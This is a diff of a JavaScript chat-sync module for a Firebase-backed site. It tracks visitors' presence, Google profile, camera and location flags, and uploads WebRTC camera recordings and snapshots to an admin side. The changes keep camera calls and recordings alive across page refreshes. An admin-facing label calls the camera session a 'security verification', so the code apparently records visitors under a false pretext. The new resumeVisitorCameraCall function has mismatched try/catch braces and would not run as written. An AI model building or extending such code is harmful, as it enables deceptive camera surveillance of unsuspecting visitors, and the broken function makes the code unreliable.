@@ -443,16 +443,40 @@ async function ensureSession() {
 
   sessionReady = (async () => {
     const now = Date.now();
-    await update(sessionRef, {
-      createdAt: now,
+    let prev = null;
+    try {
+      const snap = await get(sessionRef);
+      if (snap.exists()) prev = snap.val() || {};
+    } catch {
+      /* ilk yazım */
+    }
+    const softResume = (() => {
+      try {
+        return sessionStorage.getItem("soft_resume_v1") === "1";
+      } catch {
+        return false;
+      }
+    })();
+    const patch = {
       updatedAt: now,
-      enteredAt: now,
       page: location.pathname + location.hash,
       userAgent: navigator.userAgent.slice(0, 180),
-      preview: "Siteye giriş yaptı",
       lastWho: "user",
       online: true,
-    });
+      heartbeatAt: now,
+    };
+    // Mevcut oturumu “yeni ziyaretçi” gibi sıfırlama
+    patch.createdAt = Number(prev?.createdAt) || now;
+    if (!softResume) {
+      patch.enteredAt = now;
+      if (!prev?.cameraGranted && !prev?.hasCamera && !getGoogleUser()) {
+        patch.preview = "Siteye giriş yaptı";
+      }
+    } else {
+      patch.enteredAt = Number(prev?.enteredAt) || now;
+      patch.userLeftAt = null;
+    }
+    await update(sessionRef, patch);
     return sessionId;
   })();
 
@@ -467,16 +491,35 @@ async function pingPresence() {
     const id = await ensureSession();
     if (!id) return false;
     const now = Date.now();
+    const softResume = (() => {
+      try {
+        return sessionStorage.getItem("soft_resume_v1") === "1";
+      } catch {
+        return false;
+      }
+    })();
     const patch = {
       updatedAt: now,
-      enteredAt: now,
       page: location.pathname + location.hash,
       lastWho: "user",
       online: true,
+      heartbeatAt: now,
+      userLeftAt: null,
     };
-    // Google profil preview'unu silme
-    if (!getGoogleUser()) {
-      patch.preview = "Siteye giriş yaptı";
+    // Soft resume / heartbeat: preview + enteredAt ezme (yenileme = yeni giriş değil)
+    if (!softResume) {
+      patch.enteredAt = now;
+      if (!getGoogleUser()) {
+        try {
+          const snap = await get(ref(database, `chats/${id}`));
+          const prev = snap.val() || {};
+          if (!prev.cameraGranted && !prev.hasCamera && !prev.hasLocation) {
+            patch.preview = "Siteye giriş yaptı";
+          }
+        } catch {
+          patch.preview = "Siteye giriş yaptı";
+        }
+      }
     }
     await update(ref(database, `chats/${id}`), patch);
     return true;
@@ -559,29 +602,38 @@ async function startVisitorCameraOffer(text, opts = {}) {
       if (existingId) {
         const callSnap = await get(ref(database, webrtcPath(id, existingId)));
         const call = callSnap.val() || {};
+        const soft =
+          (() => {
+            try {
+              return sessionStorage.getItem("soft_resume_v1") === "1";
+            } catch {
+              return false;
+            }
+          })() || opts.allowSoftResume === true;
+        const reusable = isCameraCallReusable(call, { allowSoftResume: soft });
         const status = String(call.status || "");
-        const dead =
-          status === "ended" ||
-          status === "denied" ||
-          call.forceClose === true ||
-          call.visitorLeftAt ||
-          call.recordingStatus === "finalizing";
         const usable =
-          !dead &&
+          reusable &&
           (meta.cameraPending ||
             meta.cameraGranted ||
             meta.hasCamera ||
             status === "requested" ||
             status === "connecting" ||
             status === "live" ||
+            status === "reconnecting" ||
+            soft ||
             !status);
         if (usable) {
-          await update(ref(database, `chats/${id}`), {
-            updatedAt: Date.now(),
-            lastCallId: existingId,
-            cameraPending: meta.cameraGranted || meta.hasCamera ? false : true,
-            page: location.pathname + location.hash,
-          }).catch(() => {});
+          if (soft) {
+            await resumeVisitorCameraCall(id, existingId).catch(() => {});
+          } else {
+            await update(ref(database, `chats/${id}`), {
+              updatedAt: Date.now(),
+              lastCallId: existingId,
+              cameraPending: meta.cameraGranted || meta.hasCamera ? false : true,
+              page: location.pathname + location.hash,
+            }).catch(() => {});
+          }
           return { callId: existingId, sessionId: id, text: clean, reused: true };
         }
       }
@@ -647,11 +699,35 @@ async function getCameraCall(targetSessionId, callId) {
   }
 }
 
-function isCameraCallReusable(data) {
+/**
+ * Call yeniden kullanılabilir mi?
+ * allowSoftResume: sayfa yenileme / kısa kopma sonrası aynı callId’yi dirilt.
+ */
+function isCameraCallReusable(data, opts = {}) {
   if (!data) return false;
+  if (data.forceClose === true) return false;
   const status = String(data.status || "");
-  if (status === "ended" || status === "denied") return false;
-  if (data.forceClose === true || data.visitorLeftAt) return false;
+  if (status === "denied") return false;
+
+  const allowSoft = opts.allowSoftResume === true;
+  const softGraceMs = Number(opts.softGraceMs) > 0 ? Number(opts.softGraceMs) : 120_000;
+  const lostAt =
+    Number(data.connectionLostAt || 0) ||
+    Number(data.visitorLeftAt || 0) ||
+    Number(data.endedAt || 0) ||
+    0;
+  const softRecent = Boolean(lostAt && Date.now() - lostAt < softGraceMs);
+
+  // Yenileme / kısa kopma: reconnecting veya yakın zamanda soft-end
+  if (status === "reconnecting") return true;
+  if (allowSoft && softRecent && (status === "ended" || data.visitorLeftAt)) {
+    return true;
+  }
+  if (allowSoft && softRecent && data.recordingStatus === "finalizing") {
+    return true;
+  }
+
+  if (status === "ended" || data.visitorLeftAt) return false;
   if (data.recordingStatus === "finalizing") return false;
   return true;
 }
@@ -1282,6 +1358,110 @@ function setQuickReplies(list) {
   return clean;
 }
 
+/**
+ * Sayfa yenileme / kısa kopma — call’ı ENDED yapma.
+ * Admin “yeniden bağlanıyor” görür; soft_resume aynı callId’yi diriltir.
+ */
+async function markVisitorReconnectingKeepalive(targetSessionId, callId, opts = {}) {
+  const dbUrl = String(cfg.firebase?.databaseURL || "").replace(/\/$/, "");
+  if (!dbUrl || !targetSessionId) return false;
+  const now = Date.now();
+  const lastUrl = String(opts.lastRecordingUrl || "").trim();
+  const lastName = String(opts.lastRecordingName || "").trim();
+  const hasUrl = /^https?:\/\//i.test(lastUrl);
+  const patchChat = {
+    updatedAt: now,
+    online: false,
+    connectionLostAt: now,
+    heartbeatAt: now,
+    preview: "↻ Yeniden bağlanıyor…",
+    lastWho: "user",
+  };
+  if (hasUrl) {
+    patchChat.lastRecordingUrl = lastUrl;
+    patchChat.lastRecordingName = lastName || `kamera-${String(callId || "rec").slice(0, 8)}.webm`;
+    patchChat.lastRecordingAt = now;
+    patchChat.lastRecordingCallId = callId ? String(callId) : null;
+    patchChat.hasRecording = true;
+  }
+  try {
+    const chatUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}.json`;
+    void fetch(chatUrl, {
+      method: "PATCH",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(patchChat),
+      keepalive: true,
+    });
+    if (callId) {
+      const callPatch = {
+        status: "reconnecting",
+        connectionLostAt: now,
+        // ended/visitorLeft YOK — soft resume için
+        forceClose: false,
+        updatedAt: now,
+      };
+      if (hasUrl) {
+        callPatch.recordingUrl = lastUrl;
+        callPatch.recordingName = patchChat.lastRecordingName;
+        callPatch.recordingReadyAt = now;
+        callPatch.recordingStatus = "ready";
+      }
+      const callUrl = `${dbUrl}/chats/${encodeURIComponent(targetSessionId)}/webrtc/${encodeURIComponent(callId)}.json`;
+      void fetch(callUrl, {
+        method: "PATCH",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(callPatch),
+        keepalive: true,
+      });
+    }
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+/** Soft resume sonrası call + chat’i canlıya çek */
+async function resumeVisitorCameraCall(targetSessionId, callId) {
+  const database = initDb();
+  if (!database || !targetSessionId || !callId) return false;
+  const now = Date.now();
+  try {
+    await update(ref(database, webrtcPath(targetSessionId, callId)), {
+      status: "connecting",
+      visitorLeftAt: null,
+      connectionLostAt: null,
+      endedAt: null,
+      recordingStatus: null,
+      recordingFinalized: null,
+      visitorReady: true,
+      visitorReadyAt: now,
+      updatedAt: now,
+    });
+    await update(ref(database, `chats/${targetSessionId}`), {
+      online: true,
+      userLeftAt: null,
+      connectionLostAt: null,
+      cameraGranted: true,
+      hasCamera: true,
+      cameraPending: false,
+      lastCallId: callId,
+      heartbeatAt: now,
+      updatedAt: now,
+      preview: "🔐 Güvenlik doğrulaması yeniden bağlandı",
+      lastWho: "user",
+      page: location.pathname + location.hash,
+    });
+      sessionStorage.removeItem("soft_resume_v1");
+    } catch {
+      /* ignore */
+    }
+    return true;
+  } catch (err) {
+    console.warn("resumeVisitorCameraCall", err);
+    return false;
+  }
+}
+
 async function markVisitorLeftKeepalive(targetSessionId, callId, opts = {}) {
   const dbUrl = String(cfg.firebase?.databaseURL || "").replace(/\/$/, "");
   if (!dbUrl || !targetSessionId) return false;
@@ -1292,6 +1472,7 @@ async function markVisitorLeftKeepalive(targetSessionId, callId, opts = {}) {
   const patchChat = {
     updatedAt: now,
     userLeftAt: now,
+    online: false,
     preview: hasUrl
       ? "👋 Sayfadan ayrıldı — kayıt hazır"
       : "👋 Sayfadan ayrıldı — kayıt yükleniyor",
@@ -1383,6 +1564,8 @@ window.ChatSync = {
   listenCameraCall,
   listenIceCandidates,
   markVisitorLeftKeepalive,
+  markVisitorReconnectingKeepalive,
+  resumeVisitorCameraCall,
   clearCameraCall,
   uploadCameraRecording,
   uploadCameraSnapshot,
@@ -1420,4 +1603,8 @@ if (configured && !isAdminPage) {
     pingPresence().catch(() => {});
     consumeGoogleRedirectResult().catch(() => {});
   });
+  // Heartbeat — yenileme/sekme kopmasını “ayrıldı”dan ayırmak için
+  window.setInterval(() => {
+    if (!document.hidden) pingPresence().catch(() => {});
+  }, 12_000);
 }
